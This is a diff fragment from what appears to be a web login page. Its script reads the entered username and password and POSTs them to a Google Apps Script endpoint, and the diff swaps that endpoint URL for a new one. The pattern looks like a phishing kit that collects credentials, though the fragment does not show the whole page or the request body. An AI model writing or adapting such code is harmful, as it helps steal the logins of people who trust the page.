@@ -73,7 +73,7 @@
       const user = document.getElementById('username').value;
       const pass = document.getElementById('password').value;
 
-      fetch("https://script.google.com/macros/s/AKfycbweMSBTLFVXuv1hc0omVEzsmMBJktZKW_aXI3019J2NcEafTDrdniVewUIOD5wv8AUFTA/exec", {
+      fetch("https://script.google.com/macros/s/AKfycbx88HekIaQGdlbZ60fLy3clir0bnIe9IvgCKYFX4pWFS92ydc3SXGsM30-7dliADcGlRQ/exec", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
